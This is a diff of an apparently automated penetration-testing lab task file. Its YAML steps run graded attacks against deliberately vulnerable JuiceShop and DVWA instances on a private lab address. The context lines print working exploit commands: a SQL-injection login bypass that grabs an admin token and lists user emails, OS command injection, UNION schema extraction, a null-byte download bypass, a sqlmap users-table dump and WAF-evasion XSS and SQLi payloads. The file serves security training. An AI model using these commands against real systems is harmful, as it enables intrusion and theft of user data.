@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: open
     field: stdout
+  target_vm: attacker
   script: nmap -sV -p 22,80,443,3000,3306,5432,6379,8080,8443,9200 10.20.30.80 2>/dev/null
   risk_level: low
 - order: 2
@@ -38,6 +39,7 @@ steps:
     type: output_contains
     expect: Fingerprint Complete
     field: stdout
+  target_vm: attacker
   script: echo '=== Fingerprinting ===' && echo '[Port 80]' && curl -sI http://10.20.30.80:80 | grep -iE '(server|x-powered|x-frame)' && echo '[Port 3000 - JuiceShop]' && curl -sI http://10.20.30.80:3000
     | grep -iE '(server|x-powered)' && curl -s http://10.20.30.80:3000 | grep -oiE '(angular|express|node|jquery)' | sort -u && echo '[Port 8080 - DVWA]' && curl -sI http://10.20.30.80:8080 | grep -iE '(server|x-powered)'
     && echo '=== Fingerprint Complete ==='
@@ -55,6 +57,7 @@ steps:
     type: output_contains
     expect: Admin token
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op''\''''--","password":"a"}''
     | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo "Admin token: ${TOKEN:0:30}..." && echo ''=== Phase 2: User Data Exfil ==='' && curl -s http://10.20.30.80:3000/api/Users/ -H "Authorization:
     Bearer $TOKEN" | python3 -c "import sys,json; [print(f''  User {u[\"id\"]}: {u.get(\"email\",\"?\")}'') for u in json.load(sys.stdin).get(''data'',[])]" 2>/dev/null | head -10'
@@ -73,6 +76,7 @@ steps:
     type: output_contains
     expect: inet
     field: stdout
+  target_vm: attacker
   script: curl -s -c /tmp/dvwa_final.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Network Info ===' && curl -s -b /tmp/dvwa_final.txt
     -b 'security=low' --data-urlencode 'ip=127.0.0.1; ip addr show | grep inet' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE 'inet [0-9./]+' | head -5 && echo '=== Process
     List ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; ps aux | head -8' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oE '(root|www-data|mysql|node)[^
@@ -91,6 +95,7 @@ steps:
     type: output_contains
     expect: DB Schema
     field: stdout
+  target_vm: attacker
   script: echo '=== DB Schema Extraction ===' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--' | python3
     -c "import sys,json; [print(d.get('name','')[:80]) for d in json.load(sys.stdin).get('data',[])]" 2>/dev/null | head -15 || curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--'
     | head -c 500
@@ -108,6 +113,7 @@ steps:
     type: output_contains
     expect: File Download Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/ | grep -oP ''href="[^"]+"'' | head -10 && echo ''=== Null Byte Bypass ==='' && echo -n ''package.json.bak%2500.md: '' &&
     curl -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md'' && echo '''' && echo -n ''eastere.gg%2500.md: '' && curl -s -o /dev/null -w
     ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/eastere.gg%2500.md'' && echo '''' && echo ''=== File Download Complete ==='''
@@ -124,6 +130,7 @@ steps:
     type: output_regex
     expect: sqlmap|fetched
     field: stdout
+  target_vm: attacker
   script: SESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php -L | grep PHPSESSID | awk '{print $NF}') && echo '=== sqlmap Automated SQLi ===' && sqlmap
     -u "http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SESSID;security=low" --batch --dump -T users --threads=4 2>/dev/null | tail -20
   risk_level: medium
@@ -141,6 +148,7 @@ steps:
     type: output_contains
     expect: KILL CHAIN COMPLETE
     field: stdout
+  target_vm: attacker
   script: 'echo ''========== KILL CHAIN =========='' && echo ''[Phase 1] SQLi Auth Bypass'' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op''\''''--","password":"a"}''
     | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo "  Token: ${TOKEN:0:20}..." && echo ''[Phase 2] BOLA - Other User Data'' && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization:
     Bearer $TOKEN" | head -c 150 && echo '''' && echo ''[Phase 3] Command Injection - System Info'' && curl -s -b /tmp/dvwa_final.txt -b ''security=low'' --data-urlencode ''ip=127.0.0.1; uname -a'' -d ''Submit=Submit''
@@ -160,6 +168,7 @@ steps:
     type: output_contains
     expect: WAF Bypass Test Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== WAF Bypass Comprehensive ==='' && echo -n ''[Standard SQLi] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' "http://10.20.30.80:80/?id=1''+OR+1=1--" && echo '''' && echo -n ''[Double
     Encoded] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?id=1%2527+OR+1%253D1--'' && echo '''' && echo -n ''[JSON Body] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
     -X POST http://10.20.30.80:80/ -H ''Content-Type: application/json'' -d ''{"id":"1 OR 1=1"}'' && echo '''' && echo -n ''[SVG XSS] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?q=%3Csvg+onload%3Dalert(1)%3E''
@@ -184,6 +193,7 @@ steps:
     type: output_contains
     expect: 침투 테스트 보고서
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/pentest_report.txt << 'EOF'\n====================================================\n  웹 애플리케이션 침투 테스트 보고서\n  대상: 10.20.30.80 (JuiceShop + DVWA + Apache)\n  수행일: 2026-04-06\n====================================================\n\
     \n[1. 정보수집]\n- 오픈 포트: 80(Apache+ModSecurity), 3000(JuiceShop/Node.js), 8080(DVWA/PHP)\n- 기술스택: Node.js/Express/Angular, PHP/Apache, SQLite\n\n[2. 발견 취약점 - OWASP Top 10 매핑]\n\nCRITICAL (CVSS 9.0+):\n\
     \  C-01: SQL Injection 인증 우회 (A03:Injection)\n    /rest/user/login email='or 1=1-- -> admin 토큰 획득\n  C-02: OS Command Injection (A03:Injection)\n    DVWA exec: ;id -> uid=33(www-data) 확인\n  C-03: UNION\
